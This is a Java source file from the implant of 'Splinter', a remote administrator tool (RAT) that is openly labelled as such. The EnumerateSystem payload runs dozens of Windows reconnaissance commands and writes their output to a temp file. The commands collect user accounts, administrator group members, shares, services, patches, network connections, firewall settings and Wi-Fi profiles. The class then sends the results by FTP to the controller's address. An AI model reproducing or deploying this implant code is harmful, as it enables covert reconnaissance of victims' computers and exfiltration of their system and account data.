/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Implant.Payloads;

import Implant.Driver;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Sender;
import Implant.ProcessHandlerThread;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public class EnumerateSystem extends Thread
  implements Runnable
{
  public static final String strMyClassName = "EnumerateSystem";
  String strFTP_Address = "";
  int PORT = 0;
  File fleSaveDirectory = null;
  File fleEnumeration = null;
  String enumFileExtension = ".tmp";
  PrintWriter pwOut = null;
  PrintWriter sktOut = null;
  String outputDirectory = "";

  double percentTot = 4.0D;
  double percentComplete = 0.0D;

  public static String ENUMERATE_WHOAMI = "whoami";
  public static String ENUMERATE_USER_ACCOUNT_WMIC = "wmic useraccount get /format:csv";
  public static String ENUMERATE_USER_ACCOUNT_NET = "net user";
  public static String ENUMERATE_LOCALGROUP_NET = "net localgroup administrators";
  public static String ENUMERATE_SHARES_WMIC = "wmic share get /format:csv";
  public static String ENUMERATE_SHARES_NET = "net share";
  public static String ENUMERATE_NET_VIEW = "net view";
  public static String ENUMERATE_STARTUP_WMIC = "wmic startup get /format:csv";
  public static String ENUMERATE_STARTUP_NET = "net start";
  public static String ENUMERATE_LOGICAL_DRIVE = "wmic logicaldisk get /format:csv";
  public static String ENUMERATE_SERVICE_WMIC = "wmic service get /format:csv";
  public static String ENUMERATE_SQ_QUERY = "sc query";
  public static String ENUMERATE_OS_WMIC = "wmic os get /format:csv";
  public static String ENUMERATE_CPU_WMIC = "wmic CPU get /format:csv";
  public static String ENUMERATE_PATCHES = "wmic qfe get /format:csv";
  public static String ENUMERATE_SYSTEMINFO = "systeminfo";

  public static String ENUMERATE_SYSTEM_PLATFORM = "wmic csproduct get name";
  public static String ENUMERATE_SYSTEM_IdentyfingSerialNumber = "wmic csproduct get IdentifyingNumber";
  public static String ENUMERATE_SYSTEM_UUID = "wmic csproduct get UUID";
  public static String ENUMERATE_SYSTEM_VENDOR = "wmic csproduct get vendor";
  public static String ENUMERATE_SYSTEM_DRIVES = "wmic diskdrive get name,size,model";
  public static String ENUMERATE_SYSTEM_BIOS_SERIALNUMBER = "wmic bios get serialnumber";
  public static String ENUMERATE_SYSTEM_BIOS_INSTALLDATE = "wmic bios get description,version";
  public static String ENUMERATE_SYSTEM_BIOS_MANUFACTURER = "wmic bios get manufacturer";
  public static String ENUMERATE_SYSTEM_NETWORK_ADAPTERS = "wmic nic get name,macaddress,guid,physicaladapter";
  public static String ENUMERATE_SYSTEM_CPUSPEED = "wmic cpu get currentclockspeed";
  public static String ENUMERATE_SYSTEM_L2CacheSize = "wmic cpu get L2CacheSize";
  public static String ENUMERATE_SYSTEM_L3CacheSize = "wmic cpu get L3CacheSize";
  public static String ENUMERATE_SYSTEM_CPU_NAME = "wmic cpu get name";
  public static String ENUMERATE_SYSTEM_NUMBER_OF_CORES = "wmic cpu get numberofcores";
  public static String ENUMERATE_SYSTEM_CPU_ID = "wmic cpu get ProcessorId";
  public static String ENUMERATE_SYSTEM_MEMORY = "wmic memorychip get banklabel,capacity,caption,description,devicelocator,manufacturer,partnumber,serialnumber,speed,tag,totalwidth";
  public static String ENUMERATE_SYSTEM_MOTHERBOARD_MAX_MEM = "wmic memphysical get maxcapacity";
  public static String ENUMERATE_SYSTEM_LAST_LOGON = "wmic netlogin get lastlogon";
  public static String ENUMERATE_SYSTEM_HARD_DISK_DATA = "wmic volume get serialnumber,capacity,driveletter,deviceid,filesystem";
  public static String ENUMERATE_SYSTEM_USER_ACCT_SSID = "wmic useraccount get caption,name,passwordrequired,sid";
  public static String ENUMERATE_SYSTEM_TIMEZONE = "wmic timezone get description";
  public static String ENUMERATE_SYSTEM_MOTHERBOARD_PCI_SLOTS = "wmic systemslot get tag,slotdesignation";
  public static String ENUMERATE_SYSTEM_SOUND = "wmic sounddev get caption,description,deviceid";
  public static String ENUMERATE_SYSTEM_PROCESS = "wmic process get";
  public static String ENUMERATE_SYSTEM_PRINTER = "wmic printer get name";
  public static String ENUMERATE_SYSTEM_OS = "wmic os get caption,csdversion,installdate,lastbootuptime,numberofusers,osarchitecture,serialnumber,windowsdirectory,version";
  public static String ENUMERATE_SYSTEM_OS_SERVICE_PACK = "wmic os get csdversion";
  public static String ENUMERATE_SYSTEM_OS_SERIALNUMBER = "wmic os get serialnumber";

  public static String ENUMERATE_IPCONFIG = "ipconfig /all";
  public static String ENUMERATE_DNS = "ipconfig /displaydns";
  public static String ENUMERATE_FIREWALL = "netsh advfirewall show allprofiles";
  public static String ENUMERATE_WIRELESS_PROFILE = "netsh wlan show profiles";
  public static String ENUMERATE_TASKLIST = "tasklist /v";
  public static String ENUMERATE_NETSTAT = "netstat -ano";
  public static String ENUMERATE_NETSTAT_R = "netstat -r";
  public static String ENUMERATE_ROUTE = "route print";
  public static String ENUMERATE_ARP = "arp -a";

  public EnumerateSystem(String outDirectory, String FTP_address, int prt, PrintWriter socketOut)
  {
    this.strFTP_Address = FTP_address;
    this.PORT = prt;

    this.sktOut = socketOut;
    this.outputDirectory = outDirectory;
  }

  public void run()
  {
    enumerateSystem(this.outputDirectory, this.sktOut);

    Driver.sop("... --> Done!\n\nENUMERATION COMPLETE. Searching for Controller to FTP enum results...");
    this.sktOut.println("ENUMERATION COMPLETE. Searching for Controller to FTP enum results...");
    this.sktOut.flush();

    FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, this.strFTP_Address, this.PORT, 4096, this.fleEnumeration, this.sktOut, true, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
    FTP_Sender.start();
  }

  public boolean enumerateSystem(String enumerationOutDirectory, PrintWriter pwSkt)
  {
    try
    {
      System.gc();

      enumerationOutDirectory = MapSystemProperties.strTEMP;

      if (enumerationOutDirectory.endsWith(Driver.fileSeperator))
      {
        this.fleEnumeration = new File(enumerationOutDirectory + System.currentTimeMillis() + "_" + "enum" + this.enumFileExtension);
      }
      else
      {
        this.fleEnumeration = new File(enumerationOutDirectory + Driver.fileSeperator + System.currentTimeMillis() + "_" + "enum" + this.enumFileExtension);
      }

      this.pwOut = new PrintWriter(new BufferedOutputStream(new FileOutputStream(this.fleEnumeration.toString())));

      this.pwOut.println("Commencing System Enumeration started @ " + Driver.getTimeStamp_Updated() + "\n\n");
      Driver.sop("Commencing System Enumeration started @ " + Driver.getTimeStamp_Updated() + "\n\n");
      pwSkt.println("Commencing System Enumeration started @ " + Driver.getTimeStamp_Updated());
      pwSkt.flush();

      Driver.sp("Percent complete: ");
      executeEnumerationCommand(this.pwOut, "WHOAMI", ENUMERATE_WHOAMI);
      executeEnumerationCommand(this.pwOut, "ACCOUNTS", ENUMERATE_USER_ACCOUNT_NET);
      executeEnumerationCommand(this.pwOut, "ACCOUNTS - VERBOSE", ENUMERATE_USER_ACCOUNT_WMIC);
      executeEnumerationCommand(this.pwOut, "ADMIN GROUP ACCOUNT", ENUMERATE_LOCALGROUP_NET);
      executeEnumerationCommand(this.pwOut, "NET SHARES", ENUMERATE_SHARES_NET);
      executeEnumerationCommand(this.pwOut, "NET SHARES - VERBOSE", ENUMERATE_SHARES_WMIC);
      executeEnumerationCommand(this.pwOut, "NET VIEW", ENUMERATE_NET_VIEW);
      executeEnumerationCommand(this.pwOut, "LOGICAL DRIVE(S) - VERBOSE", ENUMERATE_LOGICAL_DRIVE);
      executeEnumerationCommand(this.pwOut, "STARUP SERVICES", ENUMERATE_STARTUP_NET);
      executeEnumerationCommand(this.pwOut, "STARTUP - VERBOSE", ENUMERATE_STARTUP_WMIC);
      executeEnumerationCommand(this.pwOut, "SERVICES - VERBOSE", ENUMERATE_SERVICE_WMIC);
      executeEnumerationCommand(this.pwOut, "SERVICES QUERY", ENUMERATE_SQ_QUERY);
      executeEnumerationCommand(this.pwOut, "OPERATING SYSTEM - VERBOSE", ENUMERATE_OS_WMIC);
      executeEnumerationCommand(this.pwOut, "CPU - VERBOSE", ENUMERATE_CPU_WMIC);
      executeEnumerationCommand(this.pwOut, "PATCH SUMMARY", ENUMERATE_PATCHES);
      executeEnumerationCommand(this.pwOut, "SYSTEM INFO", ENUMERATE_SYSTEMINFO);
      executeEnumerationCommand(this.pwOut, "IPCONFIG /ALL", ENUMERATE_IPCONFIG);
      executeEnumerationCommand(this.pwOut, "HOST DNS ENTRIES", ENUMERATE_DNS);
      executeEnumerationCommand(this.pwOut, "FIREWALL", ENUMERATE_FIREWALL);
      executeEnumerationCommand(this.pwOut, "WIRELESS PROFILE(S) IF APPLICABLE", ENUMERATE_WIRELESS_PROFILE);
      executeEnumerationCommand(this.pwOut, "TASKLIST", ENUMERATE_TASKLIST);
      executeEnumerationCommand(this.pwOut, "NETSTAT", ENUMERATE_NETSTAT);
      executeEnumerationCommand(this.pwOut, "NET ROUTE", ENUMERATE_NETSTAT_R);
      executeEnumerationCommand(this.pwOut, "ROUTE", ENUMERATE_ROUTE);
      executeEnumerationCommand(this.pwOut, "ARP TABLE", ENUMERATE_ARP);
      this.pwOut.flush();

      this.pwOut.println("############################################################################");
      this.pwOut.println("############################################################################");
      this.pwOut.println("##");
      this.pwOut.println("## ----->>>>>  ENUMERATION COMPLETE!!!");
      this.pwOut.println("##");
      this.pwOut.println("############################################################################");
      this.pwOut.println("############################################################################");

      this.pwOut.flush();
      this.pwOut.close();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("enumerateSystem", "EnumerateSystem", e, e.getLocalizedMessage(), false);
      Driver.sop("Unable to complete system enumeration!!!");

      if (pwSkt != null)
        try {
          pwSkt.println("PUNT!!!  Unable to complete system interrogation!!!!!");
        }
        catch (Exception localException1) {
        }
      try {
        this.pwOut.close(); } catch (Exception localException2) {  }
    }return false;
  }

  public boolean executeEnumerationCommand(PrintWriter handle, String header, String command)
  {
    try
    {
      Driver.sp("..." + (this.percentComplete += this.percentTot) + "%");

      handle.println("############################################################################");
      handle.println("############################################################################");
      handle.println("##");
      handle.println("## " + header);
      handle.println("##");
      handle.println("############################################################################");
      handle.println("############################################################################");
      handle.println(" ");
      handle.flush();

      Process process = Runtime.getRuntime().exec(command);

      BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader process_IN_ERROR = new BufferedReader(new InputStreamReader(process.getErrorStream()));

      ProcessHandlerThread process_INPUT = new ProcessHandlerThread(command, process, process_IN, handle);
      ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(command, process, process_IN_ERROR, handle);

      process_INPUT.start();
      process_INPUT_ERROR.start();

      handle.println(" ");
      handle.println(" ");

      System.gc();

      handle.flush();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("executeEnumerationCommand", "EnumerateSystem", e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}